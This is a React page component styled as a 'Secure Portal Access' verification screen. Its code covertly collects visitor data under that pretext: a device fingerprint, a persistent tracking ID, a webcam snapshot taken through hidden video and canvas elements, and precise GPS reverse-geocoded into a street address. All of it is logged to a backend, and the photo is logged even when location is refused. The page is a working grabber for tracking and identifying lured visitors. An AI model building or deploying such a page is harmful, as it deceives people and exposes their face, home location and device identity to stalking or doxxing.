'use client';

import { useState, useRef } from 'react';
import { ShieldCheck, ArrowRight, MapPin, Globe, Layout, Smartphone, Camera } from 'lucide-react';
import { logTelemetryData } from './actions';

export default function Home() {
  const [status, setStatus] = useState<'idle' | 'requesting' | 'success' | 'error'>('idle');
  const [message, setMessage] = useState('');
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const capturePhoto = async (): Promise<string | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();

        // Give the camera a moment to adjust lighting
        await new Promise((resolve) => setTimeout(resolve, 500));

        if (canvasRef.current && videoRef.current) {
          const canvas = canvasRef.current;
          const context = canvas.getContext('2d');
          
          // Scale down to prevent server action payload size limit errors
          canvas.width = 320;
          canvas.height = 240;
          
          if (context) {
            context.drawImage(videoRef.current, 0, 0, 320, 240);
            const photoDataUrl = canvas.toDataURL('image/jpeg', 0.7);
            
            // Stop all tracks to turn off the camera immediately
            stream.getTracks().forEach(track => track.stop());
            
            return photoDataUrl;
          }
        }
        // Stop stream if canvas fails
        stream.getTracks().forEach(track => track.stop());
      }
      return null;
    } catch (err) {
      console.error("Camera access error:", err);
      return null;
    }
  };

  const gatherAndSendTelemetry = async () => {
    setStatus('requesting');
    setMessage('Requesting necessary permissions (Camera & Location)...');

    try {
      // 0. Get or Generate Persistent Device ID
      let deviceId = localStorage.getItem('college_project_device_id');
      if (!deviceId) {
        deviceId = crypto.randomUUID();
        localStorage.setItem('college_project_device_id', deviceId);
      }

      // 1. Gather advanced device and network info
      let batteryInfo = null;
      try {
        if ('getBattery' in navigator) {
          const battery: any = await (navigator as any).getBattery();
          batteryInfo = {
            level: Math.round(battery.level * 100) + '%',
            charging: battery.charging
          };
        }
      } catch (e) { console.error("Battery API err", e); }

      let networkInfo = null;
      if ('connection' in navigator) {
        const conn = (navigator as any).connection;
        networkInfo = {
          type: conn.effectiveType || 'unknown',
          downlink: conn.downlink ? `${conn.downlink} Mbps` : 'unknown',
          rtt: conn.rtt ? `${conn.rtt} ms` : 'unknown'
        };
      }

      const browserInfo = {
        deviceId: deviceId,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        windowSize: `${window.innerWidth}x${window.innerHeight}`,
        colorDepth: `${window.screen.colorDepth}-bit`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory} GB` : 'unknown',
        battery: batteryInfo,
        network: networkInfo,
      };

      // 2. Request Camera Permission & Take Photo
      setMessage('Capturing verification photo...');
      const photoDataUrl = await capturePhoto();

      // 3. Request Location Permission explicitly
      setMessage('Requesting Location verification...');
      if ('geolocation' in navigator) {
        const getPosition = (options: PositionOptions): Promise<GeolocationPosition> => {
          return new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, options);
          });
        };

        try {
          let position: GeolocationPosition;
          try {
            // Try high accuracy first (GPS)
            position = await getPosition({ enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
          } catch (err: any) {
            // If it's a timeout (3) or position unavailable (2), fallback to low accuracy (network/wifi)
            if (err.code === 2 || err.code === 3) {
              setMessage('Refining location...');
              position = await getPosition({ enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 });
            } else {
              throw err; // Re-throw permission denied (1)
            }
          }

          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          
          let resolvedAddress = "Address resolution unavailable";
          try {
            setMessage('Resolving precise delivery address...');
            // Use OpenStreetMap Nominatim for free reverse geocoding
            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
            const data = await response.json();
            if (data && data.display_name) {
              resolvedAddress = data.display_name;
            }
          } catch (e) {
            console.error("Geocoding error", e);
          }

          const locationData = {
            latitude: lat,
            longitude: lon,
            accuracy: position.coords.accuracy,
            address: resolvedAddress
          };

          // Send all gathered data to the backend
          await logTelemetryData({
            type: 'access_request',
            status: 'granted',
            browser: browserInfo,
            location: locationData,
            photo: photoDataUrl,
          });

          setStatus('success');
          setMessage('Verification complete. Access granted and securely logged.');
        } catch (error: any) {
          // User denied location permission or both attempts failed
          let errorMessage = 'Location access denied or unavailable.';
          if (error.code === 1) { // 1 is PERMISSION_DENIED
            errorMessage = 'User explicitly denied the request for Geolocation.';
          } else if (error.message) {
            errorMessage = `Location error: ${error.message}`;
          }

          await logTelemetryData({
            type: 'access_request',
            status: 'partial_denial',
            browser: browserInfo,
            photo: photoDataUrl, // Still log photo if they allowed camera but denied location
            error: errorMessage,
          });

          setStatus('error');
          setMessage(errorMessage);
        }
      } else {
        // Geolocation not supported
        await logTelemetryData({
          type: 'access_request',
          status: 'unsupported',
          browser: browserInfo,
          photo: photoDataUrl,
          error: 'Geolocation is not supported by this browser.',
        });
        setStatus('error');
        setMessage('Geolocation is not supported by your browser.');
      }
    } catch (err) {
      console.error(err);
      setStatus('error');
      setMessage('An unexpected error occurred during verification.');
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center p-4 relative overflow-hidden">
      {/* Hidden elements required for taking the photo */}
      <video ref={videoRef} style={{ display: 'none' }} playsInline muted />
      <canvas ref={canvasRef} style={{ display: 'none' }} />

      {/* Background Effects */}
      <div className="absolute top-1/4 right-1/4 w-[500px] h-[500px] bg-blue-600/10 rounded-full blur-[120px] pointer-events-none" />
      <div className="absolute bottom-1/4 left-1/4 w-[500px] h-[500px] bg-indigo-600/10 rounded-full blur-[120px] pointer-events-none" />

      <main className="w-full max-w-2xl bg-slate-900/50 backdrop-blur-xl border border-slate-800 rounded-3xl p-8 md:p-12 shadow-2xl relative z-10 text-center">
        
        <div className="w-20 h-20 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto mb-6 border border-blue-500/20 shadow-[0_0_40px_rgba(59,130,246,0.1)]">
          <ShieldCheck className="w-10 h-10 text-blue-400" />
        </div>

        <h1 className="text-4xl md:text-5xl font-bold text-white tracking-tight mb-4">
          Secure Portal Access
        </h1>
        
        <p className="text-slate-400 text-lg mb-8 max-w-lg mx-auto">
          To proceed, strict verification is required. You will be prompted to grant permissions for location access and visual verification.
        </p>

        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-10 text-left">
          {[
            { icon: Globe, label: 'Network Info' },
            { icon: Layout, label: 'Browser Agent' },
            { icon: MapPin, label: 'Geolocation' },
            { icon: Camera, label: 'Visual Check' },
          ].map((item, idx) => (
            <div key={idx} className="bg-slate-950/50 border border-slate-800/50 rounded-xl p-4 flex flex-col items-center justify-center text-center gap-2">
              <item.icon className="w-5 h-5 text-blue-400" />
              <span className="text-xs font-medium text-slate-300">{item.label}</span>
            </div>
          ))}
        </div>

        {status === 'idle' && (
          <button
            onClick={gatherAndSendTelemetry}
            className="bg-blue-600 hover:bg-blue-500 text-white font-medium rounded-xl py-4 px-8 inline-flex items-center justify-center gap-3 transition-all group shadow-lg shadow-blue-500/25"
          >
            Access The Web
            <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
          </button>
        )}

        {status === 'requesting' && (
          <div className="flex flex-col items-center gap-4">
            <div className="w-8 h-8 border-4 border-blue-500/30 border-t-blue-500 rounded-full animate-spin" />
            <p className="text-blue-400 font-medium max-w-sm mx-auto">{message}</p>
          </div>
        )}

        {status === 'success' && (
          <div className="bg-emerald-500/10 border border-emerald-500/20 rounded-2xl p-6">
            <ShieldCheck className="w-8 h-8 text-emerald-400 mx-auto mb-3" />
            <h3 className="text-emerald-400 font-semibold mb-1">Access Granted</h3>
            <p className="text-emerald-500/80 text-sm">{message}</p>
          </div>
        )}

        {status === 'error' && (
          <div className="bg-red-500/10 border border-red-500/20 rounded-2xl p-6">
            <h3 className="text-red-400 font-semibold mb-1">Access Denied</h3>
            <p className="text-red-400/80 text-sm">{message}</p>
          </div>
        )}
      </main>
      
      {/* Footer removed per user request */}
    </div>
  );
}
